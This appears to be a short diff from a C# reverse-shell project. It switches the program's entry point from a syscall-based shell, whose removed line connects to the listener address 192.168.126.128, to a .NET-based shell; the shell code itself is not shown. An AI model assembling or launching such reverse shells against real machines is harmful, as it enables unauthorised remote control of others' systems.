@@ -9,11 +9,11 @@ namespace SimpleReverseShell
   {
     public static void Main(string[] args)
     {
-      //var simpleDotNetShell = new SimpleDotNetShell();
-      //simpleDotNetShell.Start();
+      var simpleDotNetShell = new SimpleDotNetShell();
+      simpleDotNetShell.Start();
 
-      var simpleSysCallShell = new SimpleSysCallShell();
-      simpleSysCallShell.Start("192.168.126.128");
+      //var simplesyscallshell = new SysCallShell();
+      //simplesyscallshell.Main(Array.Empty<string>());
     }
   }
 }
